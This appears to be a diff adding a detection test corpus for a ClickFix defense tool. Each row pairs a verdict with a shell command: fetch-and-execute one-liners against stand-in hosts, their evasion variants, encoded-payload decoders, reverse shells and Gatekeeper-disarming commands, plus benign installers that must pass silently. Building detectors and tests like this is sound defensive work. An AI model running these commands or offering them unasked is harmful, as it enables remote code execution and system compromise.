@@ -1,0 +1,140 @@
+# ClickFix Defense Kit — detection corpus
+# ---------------------------------------------------------------------------
+# ONE tab-separated row per case:  <expected verdict><TAB><command>
+#   block   = demand a typed confirmation phrase
+#   warn    = show the banner, single Enter proceeds
+#   silent  = do not interrupt the user at all
+#
+# Both ShellGuard and ClipSentinel are asserted against THIS FILE, so the two
+# layers can never drift apart again.
+#
+# Rows marked [v0.1.0-BYPASS] silently PASSED the shipped v0.1.0 grammar.
+# They are the reason this file exists. Do not delete them.
+# Rows marked [v0.1.0-FP] wrongly BLOCKED under v0.1.0. Over-prompting gets the
+# guard uninstalled, so a false positive is a real defect, not a nuisance.
+# ---------------------------------------------------------------------------
+
+# === the canonical attack (v0.1.0 caught this one) ===
+block	curl -fsSL https://evil.test/x.sh | sh
+block	curl https://evil.test/x.sh | bash
+block	wget -qO- https://evil.test/x.sh | sh
+block	curl -fsSL https://evil.test/x.sh | sudo bash
+
+# === [v0.1.0-BYPASS] shape-breaking one-character evasions ===
+block	curl https://evil.test/x.sh | bash;
+block	curl -fsSL https://evil.test/x | /bin/sh
+block	curl -fsSL https://evil.test/x | \sh
+block	curl -fsSL https://evil.test/x | 'sh'
+block	curl -fsSL https://evil.test/x | "bash"
+block	curl https://evil.test/x | command sh
+block	curl https://evil.test/x | exec bash
+block	curl https://evil.test/x | env sh
+block	curl -fsSL https://evil.test/x | sudo -u nobody sh
+
+# === [v0.1.0-BYPASS] an ordinary query string defeated the negated-run regex ===
+block	curl -s "https://evil.test/loader.sh?build=1&id=abc" | bash
+block	curl "https://evil.test/x?a=1&b=2" | sh
+block	curl -H "Accept: */*;q=0.8" https://evil.test/i.sh | bash
+
+# === [v0.1.0-BYPASS] no pipe-to-interpreter shape at all ===
+block	bash -c "$(curl -fsSL https://evil.test/p.sh)"
+block	sh -c "$(curl -fsSL https://evil.test/p.sh)"
+block	zsh -c "`curl -fsSL https://evil.test/p.sh`"
+block	$(curl -fsSL https://evil.test/x)
+
+# === [v0.1.0-BYPASS] interposed pipeline stages ===
+block	curl -fsSL https://evil.test/x | tee /tmp/p | sh
+block	curl -s https://evil.test/x.gz | gunzip | bash
+block	curl -s https://evil.test/x | tr -d '\r' | bash
+
+# === [v0.1.0-BYPASS] the allowlist told the attacker where to host ===
+block	curl -fsSL https://raw.githubusercontent.com/attacker/evil/main/x.sh | sh
+block	curl -fsSL https://raw.github.com/attacker/evil/main/x.sh | bash
+block	eval "$(curl -fsSL https://raw.githubusercontent.com/attacker/r/main/x.sh)"
+block	curl -fsSL https://raw.githubusercontent.com/attacker/r/main/x.sh | osascript
+
+# === [v0.1.0-BYPASS, ClipSentinel] substring allowlist total suppression ===
+block	curl -fsSL https://goatramz.test/get4/install.sh | bash
+block	curl -s https://evil-bun.shop/p | bash
+block	curl http://evil.test/p | bash # deno.land
+block	curl http://evil.test/p | bash # https://sh.rustup.rs
+
+# === [v0.1.0-BYPASS] AppleScript, incl. the applescript:// Script Editor lure ===
+block	osascript -e 'do shell script "curl -kSsfL https://evil.test/x | zsh"'
+block	osascript -e "do shell script \"curl https://evil.test/a | sh\""
+
+# === decoders other than base64 ===
+block	echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHBheWxvYWQ= | base64 -d | sh
+block	echo aGVsbG8= | base64 --decode | bash
+block	cat p.b64 | base64 -D | zsh
+block	xxd -r -p payload.hex | sh
+block	openssl enc -d -a -in p.b64 | bash
+
+# === inline interpreter programs that fetch and execute ===
+block	python3 -c "import urllib.request; exec(urllib.request.urlopen('https://evil.test/x').read())"
+block	perl -e 'system("curl -s https://evil.test/x | sh")'
+block	node -e "require('child_process').exec(require('http').get('https://evil.test/x'))"
+
+# === reverse shell ===
+block	bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+block	sh -c 'exec 3<>/dev/tcp/198.51.100.4/9001'
+
+# === manually disarming Gatekeeper ===
+block	xattr -d com.apple.quarantine ~/Downloads/Installer.app
+block	xattr -cr /Applications/Suspicious.app
+
+# === [v0.1.0-BYPASS] two-step download-then-run — 'warn' tier by design ===
+warn	curl -fsSL https://evil.test/x -o /tmp/p && sh /tmp/p
+warn	curl -o /tmp/p https://evil.test/x.sh; sh /tmp/p
+warn	wget -O /tmp/setup https://evil.test/s; chmod +x /tmp/setup; ./setup
+warn	curl -fsSL https://evil.test/pkg.dmg -o /tmp/a.dmg; hdiutil attach /tmp/a.dmg
+
+# === invisible / look-alike characters — 'warn' tier ===
+warn	curl -fsSL https://sh.rustup.rs | sh​
+# a Cyrillic 'с' in the COMMAND word — this is the disguise, so it warns
+warn	сurl -fsSL https://evil.test/x.sh | sh
+# ...but the same character inside a quoted string is just text, not a disguise.
+# Flagging this would be the kind of false positive that gets a guard uninstalled.
+silent	echo "vеrify you are human" && ls
+
+# === data formatters are not code loaders — downgraded, not silenced ===
+warn	curl -s https://api.example.com/v1/data | python3 -m json.tool
+
+# === trusted single-tenant installers must stay SILENT ===
+silent	curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+silent	curl -fsSL https://get.docker.com | sh
+silent	curl -fsSL https://bun.sh/install | bash
+silent	curl -sSL https://install.python-poetry.org | python3 -
+silent	curl -fsSL https://get.pnpm.io/install.sh | sh
+
+# === GitHub raw trusted ONLY by host + path prefix ===
+silent	curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh | sh
+silent	curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
+silent	bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+
+# === [v0.1.0-FP] ordinary work that must never prompt ===
+silent	ls # dont run curl https://x/y | sh
+silent	git commit -m "add /dev/tcp/host/9000 note"
+silent	python3 -c "import os; print(os.path.exists('/tmp'))"
+silent	curl -fsSL https://api.example.com/health
+silent	curl -s https://api.example.com/data | jq '.items[]'
+silent	echo "hello" | base64
+silent	git log --oneline | head -20
+silent	cat notes.md | grep curl
+silent	brew install jq
+silent	npm install && npm run build
+silent	echo $PATH | tr ':' '\n'
+
+# === userinfo trick: the request goes to evil.tld, not rustup ===
+block	curl -fsSL https://sh.rustup.rs@evil.test/x.sh | sh
+
+# === one untrusted host among trusted ones is enough ===
+block	curl -sSf https://sh.rustup.rs | sh; curl https://evil.test/b | sh
+
+# === suffix confusion must not be mistaken for the real host ===
+block	curl -fsSL https://raw.githubusercontent.com.evil.test/x.sh | sh
+
+# === known malware staging hosts are never waivable ===
+block	curl -fsSL https://gist.githubusercontent.com/a/b/raw/c/x.sh | sh
+block	curl -fsSL https://cdn.discordapp.com/attachments/1/2/p.sh | bash
+block	curl -fsSL https://pastebin.com/raw/AbCdEfGh | sh
